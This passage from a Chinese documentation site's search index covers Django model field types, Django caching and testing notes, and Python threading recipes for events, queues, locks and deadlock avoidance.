是什么类型的文件，以避免安全漏洞。对所有上传的文件进行验证，这样你才能确定文件是你认为的那样。 例如，如果你盲目地让别人上传文件，不经过验证，就上传文件到你的 Web 服务器的文档根目录下， 那么有人就可以上传一个 CGI 或 PHP 脚本，并通过访问它的 URL 在你的网站上执行该脚本。不要允许这种情况发生。 另外要注意的是，即使是上传的 HTML 文件，由于可以被浏览器执行（虽然不能被服务器执行），也会造成相当于 XSS 或 CSRF 攻击的安全威胁。 FileField 实例在数据库中被创建为 varchar 列，默认最大长度为 100 个字符。与其他字段一样，你可以使用 max_length 参数改变最大长度。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filefield.html"},{"title":"FilePathField","text":"一个 CharField，其选择仅限于文件系统中某个目录下的文件名。有一些特殊的参数，其中第一个参数是 必须的: class FilePathField(path='', match=None, recursive=False, allow_files=True, allow_folders=False, max_length=100,\\ *\\*options) FilePathField.path 必须的。一个目录的绝对文件系统路径，这个 FilePathField 应从该目录中获取其选择。例如：\"/home/images\"。 path 也可以是一个可调用对象，可以是在运行时动态设置路径的函数。例如: import os from django.conf import settings from django.db import models def images_path(): return os.path.join(settings.LOCAL_FILE_DIR, 'images') class MyModel(models.Model): file = models.FilePathField(path=images_path) FilePathField.matc 可选。一个正则表达式，作为一个字符串， FilePathField 将用于过滤文件名。 请注意，正则表达式将被应用于基本文件名，而不是完整的路径。例如：\"foo.*.txt$\"，它将匹配名为 foo23.txt 的文件，但不匹配 bar.txt 或 foo23.png。 FilePathField.recursive 可选。True 或 False。默认为 False。指定是否包含 path 的所有子目录。 FilePathField.allow_files 可选。 True 或 False。 默认值是 True。 指定是否应该包含指定位置的文件。 这个或 allow_folders 必须是 True。 FilePathField.allow_folders 可选。 True 或 False。 默认为 False。 指定是否应该包含指定位置的文件夹。 这个或 allow_files 必须是 True。 一个潜在的问题是 match 适用于基本文件名，而不是完整的路径。所以，这个例子: FilePathField(path=\"/home/images\", match=\"foo.*\", recursive=True) 将匹配 /home/images/foo.png，但不匹配 /home/images/foo/bar.png，因为 match 适用于基本文件名（ foo.png 和 bar.png ）。 FilePathField 实例在数据库中作为 varchar 列创建，默认最大长度为 100 个字符。 与其他字段一样，你可以使用 max_length 参数改变最大长度。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filepathfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filepathfield.html"},{"title":"FloatField","text":"在 Python 中用一个 float 实例表示的浮点数: class FloatField(**options) 当 localize 为 False 时是 NumberInput 否则，该字段的默认表单部件是 TextInput。 FloatField vs. DecimalField FloatField 类有时会与 DecimalField 类混淆。 虽然它们都表示实数，但它们表示的方式不同。 FloatField 内部使用 Python 的 float 类型， 而 DecimalField 则使用 Python 的 Decimal 类型。关于两者之间的区别，请参见 Python 的 decimal 模块的文档。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Floatfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Floatfield.html"},{"title":"GenericIPAddressField","text":"IPv4 或 IPv6 地址，字符串格式（如 192.0.2.30 或 2a02:42fe::4 ）。该字段的默认表单部件是一个 TextInput: class GenericIPAddressField(protocol='both', unpack_ipv4=False, **options) IPv6 地址规范化遵循 RFC 4291#section-2.2 第 2.2 节， 包括使用该节第 3 段建议的 IPv4 格式，如 ::fffff:192.0.2.0。 例如，2001:0::0:01 将被标准化为 2001::1，::fffff:0a0a:0a0a 将被标准化为 ::fffff:10.10.10.10。所有字符都转换为小写。 GenericIPAddressField.protocol 将有效输入限制为指定协议。接受的值是 'both' （默认）、'IPv4' 或 'IPv6'。匹配是不分大小写的。 GenericIPAddressField.unpack_ipv4 解压 IPv4 映射地址，如 ::fffff:192.0.2.1。如果启用该选项，该地址将被解压为 192.0.2.1。默认为禁用。只有当 protocol 设置为 'both' 时才会启用。 如果允许空值，就必须允许 null 值，因为空值会被存储为 null。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-GeneicipaddressField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-GeneicipaddressField.html"},{"title":"ImageField","text":"继承 FileField 的所有属性和方法，但也验证上传的对象是有效的图像: class ImageField(upload_to=None, height_field=None, width_field=None, max_length=100, \\*\\*options) 除了 FileField 的特殊属性外， ImageField 也有 height 和 width 属性。 为了方便查询这些属性，ImageField 有两个额外的可选参数。 ImageField.height_field 模型字段的名称，每次保存模型实例时将自动填充图像的高度。 ImageField.width_field 模型字段的名称，每次保存模型实例时将自动填充图像的宽度。 需要 Pillow 库。 ImageField 实例在数据库中创建为 varchar 列，默认最大长度为 100 个字符。与其他字段一样，你可以使用 max_length 参数改变最大长度。 该字段的默认表单部件是一个 ClearableFileInput。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-ImageField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-ImageField.html"},{"title":"IntegerField","text":"一个整数。从 -2147483648 到 2147483647 的值在 Django 支持的所有数据库中都是安全的: class IntegerField(\\*\\*options) 它使用 MinValueValidator 和 MaxValueValidator 根据默认数据库支持的值来验证输入。 当 localize 为 False 时是 NumberInput 否则，该字段的默认表单部件是 TextInput。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Integerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Integerfield.html"},{"title":"JSONField","text":"New in Django 3.1. 一个用于存储 JSON 编码数据的字段。在 Python 中，数据以其 Python 本地格式表示：字典、列表、字符串、数字、布尔值和 None: class JSONField(encoder=None, decoder=None, **options) JSONField 在 MariaDB 10.2.7+、MySQL 5.7.8+、Oracle、PostgreSQL 和 SQLite（在 JSON1 扩展被启用的情况下）都支持。 JSONField.encoder 一个可选的 json.JSONEncoder 子类，用于序列化标准 JSON 序列化器不支持的数据类型（例如 datetime.datetime 或 UUID ）。例如，你可以使用 DjangoJSONEncoder 类。 默认为 json.JSONEncoder。 JSONField.decoder 一个可选的 json.JSONDecoder 子类，用于反序列化从数据库中获取的值。 该值将采用自定义编码器选择的格式（通常是字符串）。 你的反序列化可能需要考虑到你无法确定输入类型的事实。 例如，你有可能返回一个 datetime，实际上是一个字符串，而这个字符串恰好与 datetime 选择的格式相同。 默认为 json.JSONDecoder。 如果你给字段一个 default，确保它是一个不可变的对象， 比如 str，或者是一个每次返回一个新的可变对象的可调用对象， 比如 dict 或一个函数。提供一个像 default={} 或 default=[] 这样的可改变的默认对象，在所有模型实例之间共享一个对象。 要在数据库中查询 JSONField，请看 查询 JSONField。 索引 Index 和 Field.db_index 都创建了一个 B 树索引，在查询 JSONField 的时候并不是特别有用。仅在 PostgreSQL 上，可以使用 GinIndex 比较适合。 PostgreSQL 用户 PostgreSQL 有两种基于 JSON 的原生数据类型： json 和 jsonb。json 和 jsonb。 它们之间的主要区别在于它们的存储方式和查询方式。 PostgreSQL 的 json 字段是作为 JSON 的原始字符串表示来存储的，当根据键来查询时，必须同时进行解码。 jsonb 字段是基于 JSON 的实际结构存储的，它允许索引。这样做的代价是在写入 jsonb 字段时增加了一点成本。JSONField 使用 jsonb。 Oracle 用户 Oracle 数据库不支持存储 JSON 标量值。只支持 JSON 对象和数组（在 Python 中使用 dict 和 list 表示)。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Jsonfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Jsonfield.html"},{"title":"NullBooleanField","text":"就像 BooleanField 的 null=True: class NullBooleanField(**options) 3.1 版后已移除: NullBooleanField 已被废弃，改为 BooleanField(null=True)。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-NullBooleanfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-NullBooleanfield.html"},{"title":"PositiveIntegerField","text":"就像 IntegerField 一样，但必须是正值或零（ 0 ）。 从 0 到 2147483647 的值在 Django 支持的所有数据库中都是安全的。出于向后兼容的原因，接受 0 的值: class PositiveIntegerField(**options)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositiveIntegerField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositiveIntegerField.html"},{"title":"PositiveBigIntegerField","text":"New in Django 3.1. 就像一个 PositiveIntegerField，但只允许在某一特定点下的值（依赖于数据库）。 0 到 9223372036854775807 的值在 Django 支持的所有数据库中都是安全的: class PositiveBigIntegerField(**options)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Positivebigintegerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Positivebigintegerfield.html"},{"title":"PositiveSmallIntegerField","text":"就像一个 PositiveIntegerField，但只允许在某一特定（数据库依赖的）点下取值。0 到 32767 的值在 Django 支持的所有数据库中都是安全的: class PositiveSmallIntegerField(**options)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositivesmallintegerField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-PositivesmallintegerField.html"},{"title":"SlugField","text":"Slug 是一个报纸术语。slug 是一个简短的标签，只包含字母、数字、下划线或连字符。它们一般用于 URL 中: class SlugField(max_length=50, **options) 像 CharField 一样，你可以指定 max_length （也请阅读那一节中关于数据库可移植性和 max_length 的说明）。 如果没有指定 max_length，Django 将使用默认长度 50。 意味着将 Field.db_index 设置为 True。 基于其他值的值自动预填充一个 SlugField 通常是很有用的。 你可以在管理中使用 prepopulated_fields 来自动完成。 它使用 validate_slug 或 validate_unicode_slug 进行验证。 SlugField.allow_unicode 如果是 True，该字段除了接受 ASCII 字母外，还接受 Unicode 字母。默认值为 False。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Slugfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Slugfield.html"},{"title":"SmallAutoField","text":"就像一个 AutoField，但只允许值在一定（依赖于数据库）的限制下。1 到 32767 的值在 Django 支持的所有数据库中都是安全的: class SmallAutoField(**options)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallautofield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallautofield.html"},{"title":"SmallIntegerField","text":"就像一个 IntegerField，但只允许在某一特定（依赖于数据库的）点下取值。从 -32768 到 32767 的值在 Django 支持的所有数据库中都是安全的: class SmallIntegerField(**options)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallintegerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallintegerfield.html"},{"title":"TextField","text":"一个大的文本字段。该字段的默认表单部件是一个 Textarea: class TextField(**options) 如果你指定了 max_length 属性，它将反映在自动生成的表单字段的 Textarea 部件中。 但是，它并没有在模型或数据库层面被强制执行。使用一个 CharField 来实现。 TextField.db_collation New in Django 3.2. 该字段的数据库字符序名称。 注解 字符序名称是不标准化的。因此，这将无法在多个数据库后端之间进行移植。 Oracle Oracle 不支持 TextField 的字符序。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Textfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Textfield.html"},{"title":"TimeField","text":"一个时间，在 Python 中用 datetime.time 实例表示。接受与 DateField 相同的自动填充选项: class TimeField(auto_now=False, auto_now_add=False, **options) 该字段默认的表单部件t是一个 TimeInput。管理中添加了一些 JavaScript 快捷方式。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Timefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Timefield.html"},{"title":"URLField","text":"URL 的 CharField，由 URLValidator 验证: class URLField(max_length=200, **options) 该字段的默认表单部件是一个 URLInput。 像所有的 CharField 子类一样， URLField 接受可选的 max_length 参数。如果你没有指定 max_length 参数，则使用默认的 200。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Urlfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Urlfield.html"},{"title":"UUIDField","text":"一个用于存储通用唯一标识符的字段。使用 Python 的 UUID 类。当在 PostgreSQL 上使用时，它存储在一个 uuid 的数据类型中，否则存储在一个 char(32) 中: class UUIDField(**options) 通用唯一标识符是 primary_key 的 AutoField 的一个很好的替代方案。数据库不会为你生成 UUID，所以建议使用 default import uuid from django.db import models class MyUUIDModel(models.Model): id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False) # other fields 请注意，一个可调用对象（省略括号）被传递给 default，而不是 UUID 的实例。 在 PostgreSQL 上查找 在 PostgreSQL 上使用 iexact、contains、icontains、startswith、istartswith、endswith 或 iendswith 在 PostgreSQL 上查找没有连字符的值是行不通的，因为 PostgreSQL 将它们存储在一个连字符的 uuid 数据类型中。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Uuidfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Uuidfield.html"},{"title":"问题总结","text":"缓存模块的问题 使用的 LocMemCache 是不能作同步缓存的 注意每个进程都有自己的私有缓存实例，这意味着不可能有跨进程缓存 所以说, LocMemCache是不能用来做同步缓存的! 请使用别的任意Cache! 可以参考以下链接使用其他的缓存 参考:: 震惊！Django缓存中的数据频频丢失，究竟谁是幕后黑手 使用其他的缓存 Django项目如何配置Memcached和Redis缓存?哪个更好? Redis和Memcache的区别分析 时间格式转换 如: # django 数据库查询 2021-07-30T02:46:00.Z 格式日期转换 # 末日数据库格式查询结果 a = datetime.datetime('2021-07-30T02:46:00.Z') TIME_ZONE = 'Asia/Shanghai' TZ_SHANGHAI = pytz.timezone(TIME_ZONE) # 转换 a.astimezone(TZ_SHANGHAI).strftime('%Y-%m-%d %H:%M:%S')","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-conclusion-of-issue.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-conclusion-of-issue.html"},{"title":"测试","text":"一份好的业务代码，是需要经过实际测试的。 一方面是自己确认代码运行正常，另一方面是对外提供测试信息。 编写方法 一般来说，Django的测试用例应该定义在应用的 tests.py 文件里。 系统会自动在以 tests 开头的文件里寻找并执行测试代码。 比如有一个 polls 的django应用，将以下代码写入 tests.py: import datetime from django.test import TestCase from django.utils import timezone from .models import Question class QuestionModelTests(TestCase): def test_was_published_recently_with_future_question(self): \"\"\" was_published_recently() returns False for questions whose pub_date is in the future. \"\"\" time = timezone.now() + datetime.timedelta(days=30) future_question = Question(pub_date=time) self.assertIs(future_question.was_published_recently(), False) 解读： 创建一个 django.test.TestCase 的子类，并添加一个方法， 此方法创建一个 pub_date 时未来某天的 Question 实例。 然后检查它的 was_published_recently() 方法的返回值——它 应该 是 False。 运行测试 在终端中，我们通过输入以下代码运行测试: $ python manage.py test polls 你将会看到运行结果: Creating test database for alias 'default'... System check identified no issues (0 silenced). F ====================================================================== FAIL: test_was_published_recently_with_future_question (polls.tests.QuestionModelTests) ---------------------------------------------------------------------- Traceback (most recent call last): File \"/path/to/mysite/polls/tests.py\", line 16, in test_was_published_recently_with_future_question self.assertIs(future_question.was_published_recently(), False) AssertionError: True is not False ---------------------------------------------------------------------- Ran 1 test in 0.001s FAILED (failures=1) Destroying test database for alias 'default'... 以下是自动化测试的运行过程： python manage.py test polls 将会寻找 polls 应用里的测试代码 它找到了 django.test.TestCase 的一个子类 它创建一个特殊的数据库供测试使用 它在类中寻找测试方法——以 test 开头的方法。 在 test_was_published_recently_with_future_question 方法中，它创建了一个 pub_date 值为 30 天后的 Question 实例。 接着使用 assertls() 方法，发现 was_published_recently() 返回了 True ，而我们期望它返回 False 。 测试系统通知我们哪些测试样例失败了，和造成测试失败的代码所在的行号。 参考: 自动化测试简介","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-test.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-test.html"},{"title":"并发编程","text":"对于并发编程, Python 有多种长期支持的方法, 包括多线程, 调用子进程, 以及各种 各样的关于生成器函数的技巧. 这一章将会给出并发编程各种方面的技巧, 包括通用的 多线程技术以及并行计算的实现方法 启动与停止线程 问题 你要为需要并发执行的代码创建/销毁线程 解决方案 threading 库可以在单独的线程中执行任何的在 Python 中可以调用的对象。你可 以创建一个 Thread 对象并将你要执行的对象以 target 参数的形式提供给该对象。 例子: def countdown(n): ... from threading import Thread t = Thread(target=countdown, args=(10,)) t.start() 当你创建好一个线程对象后，该对象并不会立即执行，除非你调用它的 start() 方法（当你调用 start() 方法时，它会调用你传递进来的函数，并把你传递进来的参 数传递给该函数）。Python 中的线程会在一个单独的系统级线程中执行（比如说一个 POSIX 线程或者一个 Windows 线程），这些线程将由操作系统来全权管理。线程一旦 启动，将独立执行直到目标函数返回。 也可以将一个线程加入到当前线程，并等待它终止: t.join() Python 解释器直到所有线程都终止前仍保持运行。对于需要长时间运行的线程或 者需要一直运行的后台任务，你应当考虑使用后台线程: t = Thread(target=countdown, args=(10,), daemon=True) t.start() 后台线程无法等待，不过，这些线程会在主线程终止时自动销毁。除了如上所示的 两个操作，并没有太多可以对线程做的事情。你无法结束一个线程，无法给它发送信 号，无法调整它的调度，也无法执行其他高级操作。如果需要这些特性，你需要自己添 加。比如说，如果你需要终止线程，那么这个线程必须通过编程在某个特定点轮询来退 出。你可以像下边这样把线程放入一个类中: class CountdownTask: def __init__(self): self._running = True def terminate(self): self._running = False def run(self, n): while self._running and n > 0: print('T-minus', n) n -= 1 time.sleep(5) c = CountdownTask() t = Thread(target=c.run, args=(10,)) t.start() c.terminate() # Signal termination t.join() # Wait for actual termination (if needed) 如果线程执行一些像 I/O 这样的阻塞操作，那么通过轮询来终止线程将使得线程 之间的协调变得非常棘手。比如，如果一个线程一直阻塞在一个 I/O 操作上，它就永 远无法返回，也就无法检查自己是否已经被结束了。要正确处理这些问题，你需要利用 超时循环来小心操作线程: def run(self, sock): # sock is a socket sock.settimeout(5) # Set timeout period while self._running: # Perform a blocking I/O operation w/ timeout try: data = sock.recv(8192) break except socket.timeout: continue return 讨论 由于全局解释锁（GIL）的原因，Python 的线程被限制到同一时刻只允许一个线 程执行这样一个执行模型。所以，Python 的线程更适用于处理 I/O 和其他需要并发执 行的阻塞操作（比如等待 I/O、等待从数据库获取数据等等），而不是需要多处理器并 行的计算密集型任务。 判断线程是否已经启动 问题 你已经启动了一个线程，但是你想知道它是不是真的已经开始运行了。 解决方案 线程的一个关键特性是每个线程都是独立运行且状态不可预测。如果程序中的其 他线程需要通过判断某个线程的状态来确定自己下一步的操作，这时线程同步问题就 会变得非常棘手。为了解决这些问题，我们需要使用 threading 库中的 Event 对象。 Event 对象包含一个可由线程设置的信号标志，它允许线程等待某些事件的发生。在初 始情况下，event 对象中的信号标志被设置为假。如果有线程等待一个 event 对象，而 这个 event 对象的标志为假，那么这个线程将会被一直阻塞直至该标志为真。一个线程 如果将一个 event 对象的信号标志设置为真，它将唤醒所有等待这个 event 对象的线 程。如果一个线程等待一个已经被设置为真的 event 对象，那么它将忽略这个事件，继 续执行。下边的代码展示了如何使用 Event 来协调线程的启动: from threading import Thread, Event import time # Code to execute in an independent thread def countdown(n, started_evt): print('countdown starting') started_evt.set() while n > 0: print('T-minus', n) n -= 1 time.sleep(5) # Create the event object that will be used to signal startup started_evt = Event() # Launch the thread and pass the startup event print('Launching countdown') t = Thread(target=countdown, args=(10,started_evt)) t.start() # Wait for the thread to start started_evt.wait() print('countdown is running') 当你执行这段代码，\"countdown is running\"总是显示在\"countdown starting\"之 后显示。这是由于使用 event 来协调线程，使得主线程要等到 countdown() 函数输出 启动信息后，才能继续执行 讨论 event 对象最好单次使用，就是说，你创建一个 event 对象，让某个线程等待这个 对象，一旦这个对象被设置为真，你就应该丢弃它。尽管可以通过 clear() 方法来重 置 event 对象，但是很难确保安全地清理 event 对象并对它重新赋值。很可能会发生错 过事件、死锁或者其他问题（特别是，你无法保证重置 event 对象的代码会在线程再次 等待这个 event 对象之前执行）。如果一个线程需要不停地重复使用 event 对象，你最 好使用 Condition 对象来代替。 Condition直接使用with即可, 使用notify唤醒其他线程. event 对象的一个重要特点是当它被设置为真时会唤醒所有等待它的线程。如果你 只想唤醒单个线程，最好是使用信号量或者 Condition 对象来替代。 信号量Semaphore使用acquire和release 编写涉及到大量的线程间同步问题的代码会让你痛不欲生。比较合适的方式是使 用队列来进行线程间通信或者每个把线程当作一个 Actor，利用 Actor 模型来控制并 发。 线程间通信 问题 你的程序中有多个线程，你需要在这些线程之间安全地交换信息或数据 解决方案 从一个线程向另一个线程发送数据最安全的方式可能就是使用 queue 库中的队列 了。创建一个被多个线程共享的 Queue 对象，这些线程通过使用 put() 和 get() 操作 来向队列中添加或者删除元素。 Queue 对象已经包含了必要的锁，所以你可以通过它在多个线程间多安全地共享数 据。当使用队列时，协调生产者和消费者的关闭问题可能会有一些麻烦。一个通用的解 决方法是在队列中放置一个特殊的值，当消费者读到这个值的时候，终止执行。 有一个特殊的地方：消费者在读到这个特殊值之后立即又把它放回到队列 中，将之传递下去。这样，所有监听这个队列的消费者线程就可以全部关闭了。尽管队 列是最常见的线程间通信机制，但是仍然可以自己通过创建自己的数据结构并添加所 需的锁和同步机制来实现线程间通信。最常见的方法是使用 Condition 变量来包装你 的数据结构。 使用队列来进行线程间通信是一个单向、不确定的过程。通常情况下，你没有办法 知道接收数据的线程是什么时候接收到的数据并开始工作的。不过队列对象提供一些 基本完成的特性，比如下边这个例子中的 task_done() 和 join() # A thread that consumes data def consumer(in_q): while True: # Get some data data = in_q.get() # Process the data ... # Indicate completion in_q.task_done() q = Queue() t1 = Thread(target=consumer, args=(q,)) # Wait for all produced items to be consumed q.join() 如果一个线程需要在一个\"消费者\"线程处理完特定的数据项时立即得到通知， 你可以把要发送的数据和一个 Event 放到一起使用，这样\"生产者\"就可以通过这个 Event 对象来监测处理的过程了: # Make an (data, event) pair and hand it to the consumer evt = Event() out_q.put((data, evt)) ... # Wait for the consumer to process the item evt.wait() 讨论 基于简单队列编写多线程程序在多数情况下是一个比较明智的选择。从线程安全 队列的底层实现来看，你无需在你的代码中使用锁和其他底层的同步机制，这些只会把 你的程序弄得乱七八糟。此外，使用队列这种基于消息的通信机制可以被扩展到更大的 应用范畴，比如，你可以把你的程序放入多个进程甚至是分布式系统而无需改变底层的 队列结构。使用线程队列有一个要注意的问题是，向队列中添加数据项时并不会复制此 数据项，线程间通信实际上是在线程间传递对象引用。如果你担心对象的共享状态，那 你最好只传递不可修改的数据结构（如：整型、字符串或者元组）或者一个对象的深拷 贝。 Queue 对象提供一些在当前上下文很有用的附加特性。比如在创建 Queue 对象时 提供可选的 size 参数来限制可以添加到队列中的元素数量。对于\"生产者\"与\"消费 者\"速度有差异的情况，为队列中的元素数量添加上限是有意义的。比如，一个\"生产 者\"产生项目的速度比\"消费者\"\"消费\"的速度快，那么使用固定大小的队列就可以 在队列已满的时候阻塞队列，以免未预期的连锁效应扩散整个程序造成死锁或者程序 运行失常。在通信的线程之间进行\"流量控制\"是一个看起来容易实现起来困难的问 题。如果你发现自己曾经试图通过摆弄队列大小来解决一个问题，这也许就标志着你的 程序可能存在脆弱设计或者固有的可伸缩问题。get() 和 put() 方法都支持非阻塞方 式和设定超时，: import queue q = queue.Queue() data = q.get(block=False) data = q.get(timeout=5.0) get时为空或者超时没获取到是就是queue.Empty异常, put但是满了就是queue.Full异常. 最后，有 q.qsize() ，q.full() ，q.empty() 等实用方法可以获取一个队列的当前 大小和状态。但要注意，这些方法都不是线程安全的。可能你对一个队列使用 empty() 判断出这个队列为空，但同时另外一个线程可能已经向这个队列中插入一个数据项。所 以，你最好不要在你的代码中使用这些方法。 给关键部分加锁 问题 你需要对多线程程序中的临界区加锁以避免竞争条件。 解决方案 要在多线程程序中安全使用可变对象，你需要使用 threading 库中的 Lock 对象 Lock 对象和 with 语句块一起使用可以保证互斥执行，就是每次只有一个线程可 以执行 with 语句包含的代码块。with 语句会在这个代码块执行前自动获取锁，在执行 结束后自动释放锁。 讨论 线程调度本质上是不确定的，因此，在多线程程序中错误地使用锁机制可能会导致 随机数据损坏或者其他的异常行为，我们称之为竞争条件。为了避免竞争条件，最好只 在临界区（对临界资源进行操作的那部分代码）使用锁。在一些\"老的\"Python 代码 中，显式获取和释放锁是很常见的: self._value_lock = threading.Lock() self._value_lock.acquire() self._value += delta self._value_lock.release() 相比于这种显式调用的方法，with 语句更加优雅，也更不容易出错，特别是程序员 可能会忘记调用 release() 方法或者程序在获得锁之后产生异常这两种情况（使用 with 语句可以保证在这两种情况下仍能正确释放锁）。 为了避免出现死锁的情况，使用锁机 制的程序应该设定为每个线程一次只允许获取一个锁。如果不能这样做的话，你就需 要更高级的死锁避免机制. 在 threading 库中还提供了其他的 同步原语，比如 RLock 和 Semaphore 对象。但是根据以往经验，这些原语是用于一些 特殊的情况，如果你只是需要简单地对可变对象进行锁定，那就不应该使用它们。一个 RLock （可重入锁）可以被同一个线程多次获取，主要用来实现基于监测对象模式的锁 定和同步。在使用这种锁的情况下，当锁被持有时，只有一个线程可以使用完整的函数 或者类中的方法。 一个类级RLOCK锁可以保证一次 只有一个线程可以调用这个类方法。不过，与一个标准的锁不同的是，已经持有这个锁 的方法在调用同样使用这个锁的方法时，无需再次获取锁。(与以前看到的好像有点不一样, 以前的理解是每次递归都会加一次锁, 加了多少次就需要释放多少次) 尽管你可以在程序中像标准锁一样使用信号量来做线程同步，但是这种方式并不被 推荐，因为使用信号量为程序增加的复杂性会影响程序性能。相对于简单地作为锁使 用，信号量更适用于那些需要在线程之间引入信号或者限制的程序。比如，你需要限制 一段代码的并发访问量 防止死锁的加锁机制 问题 你正在写一个多线程程序，其中线程需要一次获取多个锁，此时如何避免死锁问 题。 解决方案 在多线程程序中，死锁问题很大一部分是由于线程同时获取多个锁造成的。举个例 子：一个线程获取了第一个锁，然后在获取第二个锁的时候发生阻塞，那么这个线程就 可能阻塞其他线程的执行，从而导致整个程序假死。解决死锁问题的一种方案是为程序 中的每一个锁分配一个唯一的 id，然后只允许按照升序规则来使用多个锁，这个规则 使用上下文管理器是非常容易实现的: import threading from contextlib import contextmanager # Thread-local state to stored information on locks already acquired _local = threading.local() @contextmanager def acquire(*locks): # Sort locks by object identifier locks = sorted(locks, key=lambda x: id(x)) # Make sure lock order of previously acquired locks is not violated acquired = getattr(_local,'acquired',[]) if acquired and max(id(lock) for lock in acquired) >= id(locks[0]): raise RuntimeError('Lock Order Violation') # Acquire all of the locks acquired.extend(locks) _local.acquired = acquired try: for lock in locks: lock.acquire() yield finally: # Release locks in reverse order of acquisition for lock in reversed(locks): lock.release() del acquired[-len(locks):] 如何使用这个上下文管理器呢？你可以按照正常途径创建一个锁对象，但不论是 单个锁还是多个锁中都使用 acquire() 函数来申请锁，示例如下: import threading x_lock = threading.Lock() y_lock = threading.Lock() def thread_1(): while True: with acquire(x_lock, y_lock): print('Thread-1') def thread_2(): while True: with acquire(y_lock, x_lock): print('Thread-2') t1 = threading.Thread(target=thread_1) t1.daemon = True t1.start() t2 = threading.Thread(target=thread_2) t2.daemon = True t2.start() 如果你执行这段代码，你会发现它即使在不同的函数中以不同的顺序获取锁也没 有发生死锁。其关键在于，在第一段代码中，我们对这些锁进行了排序。通过排序，使 得不管用户以什么样的顺序来请求锁，这些锁都会按照固定的顺序被获取。如果有多个 acquire() 操作被嵌套调用，可以通过线程本地存储（TLS）来检测潜在的死锁问题。 讨论 死锁是每一个多线程程序都会面临的一个问题（就像它是每一本操作系统课本的 共同话题一样）。根据经验来讲，尽可能保证每一个线程只能同时保持一个锁，这样程 序就不会被死锁问题所困扰。一旦有线程同时申请多个锁，一切就不可预料了。 死锁的检测与恢复是一个几乎没有优雅的解决方案的扩展话题。一个比较常用的 死锁检测与恢复的方案是引入看门狗计数器。当线程正常运行的时候会每隔一段时间 重置计数器，在没有发生死锁的情况下，一切都正常进行。一旦发生死锁，由于无法重 置计数器导致定时器超时，这时程序会通过重启自身恢复到正常状态。 避免死锁是另外一种解决死锁问题的方式，在进程获取锁的时候会严格按照对象 id 升序排列获取，经过数学证明，这样保证程序不会进入死锁状态。 避免死锁的主要思想是，单纯地按照对象 id 递增的顺序加锁不会产生循环 依赖，而循环依赖是死锁的一个必要条件，从而避免程序进入死锁状态。 保存线程的状态信息 问题 你需要保存正在运行线程的状态，这个状态对于其他的线程是不可见的。 解决方案 有时在多线程编程中，你需要只保存当前运行线程的状态。要这么做，可使用 thread.local() 创建一个本地线程存储对象。对这个对象的属性的保存和读取操作都 只会对执行线程可见，而其他线程并不可见。 讨论 在大部分程序中创建和操作线程特定状态并不会有什么问题。不过，当出了问题的 时候，通常是因为某个对象被多个线程使用到，用来操作一些专用的系统资源，比如一 个套接字或文件。你不能让所有线程贡献一个单独对象，因为多个线程同时读和写的时 候会产生混乱。本地线程存储通过让这些资源只能在被使用的线程中可见来解决这个 问题。 每个 threading.local() 实例为每个线程维护着一个单独的实例字典。 所有普通实例操作比如获取、修改和删除值仅仅操作这个字典。每个线程使用一个独立 的字典就可以保证数据的隔离了 创建一个线程池 问题 你创建一个工作者线程池，用来相应客户端请求或执行其他的工作。 解决方案 concurrent.futures 函数库有一个 